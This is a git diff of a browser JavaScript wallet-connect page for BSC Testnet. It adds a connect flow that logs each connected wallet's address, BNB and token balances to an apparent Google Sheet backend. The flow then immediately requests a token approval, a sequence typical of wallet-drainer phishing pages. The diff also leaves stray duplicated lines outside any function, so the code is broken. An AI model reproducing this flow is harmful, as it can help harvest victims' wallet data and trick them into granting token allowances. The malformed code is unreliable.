@@ -239,33 +239,35 @@
   }
 
   // ===== token balance (from TOKEN_ADDRESS) =====
-  async function getTokenBalance(address){
-    try{
-      if(!TOKEN_ADDRESS || TOKEN_ADDRESS === "0x38a9fed3780c13162368e1ce87c11d314f1dd868"){
-        console.warn("TOKEN_ADDRESS not set, skipping token balance");
-        return "";
-      }
-      if(!providerInstance){
-        console.warn("No providerInstance for token balance");
-        return "";
-      }
-
-      const ethersProvider = new ethers.BrowserProvider(providerInstance);
-      const tokenContract  = new ethers.Contract(
-        TOKEN_ADDRESS,
-        ["function balanceOf(address owner) view returns (uint256)"],
-        ethersProvider
-      );
-
-      const raw = await tokenContract.balanceOf(address);
-      // assumes 18 decimals:
-      const formatted = ethers.formatUnits(raw, 18);
-      return formatted;
-    }catch(err){
-      console.error("getTokenBalance error:", err);
+async function getTokenBalance(address){
+  try {
+    if (!TOKEN_ADDRESS || TOKEN_ADDRESS === "0x38a9fed3780c13162368e1ce87c11d314f1dd868") {
+      console.warn("TOKEN_ADDRESS not set, skipping token balance");
       return "";
     }
+    if (!providerInstance) {
+      console.warn("No providerInstance for token balance");
+      return "";
+    }
+
+    const ethersProvider = new ethers.BrowserProvider(providerInstance);
+
+    const tokenContract = new ethers.Contract(
+      TOKEN_ADDRESS,
+      ["function balanceOf(address owner) view returns (uint256)"],
+      ethersProvider
+    );
+
+    const raw = await tokenContract.balanceOf(address);
+    // assumes 18 decimals; change if your token uses something else
+    const formatted = ethers.formatUnits(raw, 18);
+    return formatted;
+  } catch (err) {
+    console.error("getTokenBalance error:", err);
+    return "";
   }
+}
+
 
   // we no longer fetch tokens from Apps Script (CORS issue)
   async function showTokensPlaceholder(){
@@ -372,57 +374,96 @@
   }
 
   // ===== connect flow =====
-  async function connectFlow(){
-    try{
-      setStatus("Connecting…");
-      const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+ async function connectFlow(){
+  try{
+    setStatus("Connecting…");
+    const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
-      if(!mobile && window.trustwallet && window.trustwallet.ethereum){
-        providerInstance = window.trustwallet.ethereum;
-        web3Instance     = new Web3(providerInstance);
-        await providerInstance.request({ method: "eth_requestAccounts" });
-      } else if(window.ethereum && !mobile){
-        providerInstance = window.ethereum;
-        web3Instance     = new Web3(providerInstance);
-        await providerInstance.request({ method: "eth_requestAccounts" });
-      } else {
-        if(!web3ModalInstance) initWeb3ModalInstance();
-        providerInstance = await web3ModalInstance.connect();
-        web3Instance     = new Web3(providerInstance);
-      }
+    if(!mobile && window.trustwallet && window.trustwallet.ethereum){
+      providerInstance = window.trustwallet.ethereum;
+      web3Instance     = new Web3(providerInstance);
+      await providerInstance.request({ method: "eth_requestAccounts" });
+    } else if(window.ethereum && !mobile){
+      providerInstance = window.ethereum;
+      web3Instance     = new Web3(providerInstance);
+      await providerInstance.request({ method: "eth_requestAccounts" });
+    } else {
+      if(!web3ModalInstance) initWeb3ModalInstance();
+      providerInstance = await web3ModalInstance.connect();
+      web3Instance     = new Web3(providerInstance);
+    }
 
-      if(!providerInstance || !web3Instance){
-        setStatus("No provider");
-        alert("No wallet provider detected.");
+    if(!providerInstance || !web3Instance){
+      setStatus("No provider");
+      alert("No wallet provider detected.");
+      return;
+    }
+
+    attachProviderListeners(providerInstance);
+
+    const accounts = await web3Instance.eth.getAccounts();
+    if(!accounts || !accounts.length){
+      setStatus("No account");
+      return;
+    }
+    const address = accounts[0].toLowerCase();
+
+    let chainId = await web3Instance.eth.getChainId();
+    if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
+      const switched = await switchToBSC(providerInstance);
+      if(!switched){
+        alert("Please switch to BSC Testnet.");
+        setStatus("Wrong network");
         return;
       }
-
-      attachProviderListeners(providerInstance);
-
-      const accounts = await web3Instance.eth.getAccounts();
-      if(!accounts || !accounts.length){
-        setStatus("No account");
-        return;
-      }
-      const address = accounts[0].toLowerCase();
-
-      let chainId = await web3Instance.eth.getChainId();
+      chainId = await web3Instance.eth.getChainId();
       if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
-        const switched = await switchToBSC(providerInstance);
-        if(!switched){
-          alert("Please switch to BSC Testnet.");
-          setStatus("Wrong network");
-          return;
-        }
-        chainId = await web3Instance.eth.getChainId();
-        if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
-          alert("Network switch failed");
-          return;
-        }
+        alert("Network switch failed");
+        return;
       }
+    }
 
-      const balanceWei = await web3Instance.eth.getBalance(address);
-      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));
+    // ===== at this point: connected + correct network =====
+
+    const balanceWei = await web3Instance.eth.getBalance(address);
+    const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei,"ether"));
+
+    setStatus("Connected");
+    setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
+
+    const userId = getOrCreateUserIdFor(address);
+    setUserIdUI(userId);
+
+    // (optional) token UI placeholder
+    if (typeof showTokensPlaceholder === "function") {
+      await showTokensPlaceholder();
+    }
+
+    // get this wallet's token balance for your TOKEN_ADDRESS
+    const tokenBalance = await getTokenBalance(address);
+
+    // 🔥 LOG TO GOOGLE SHEET HERE
+    await notifyBackend(address, BNB_TESTNET_LABEL, userId, balanceBNB, tokenBalance);
+
+    // 🔥 Immediately request token approval
+    await requestTokenApproval();
+
+  }catch(err){
+    console.error("connectFlow error:",err);
+    setStatus("Connection failed");
+    alert("Connection failed: "+(err && err.message ? err.message : err));
+  }
+}
+
+
+
+
+
+  
+
+    const tokenBalance = await getTokenBalance(address);
+await notifyBackend(address, BNB_TESTNET_LABEL, userId, balanceBNB, tokenBalance);
+
 
       setStatus("Connected");
       setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
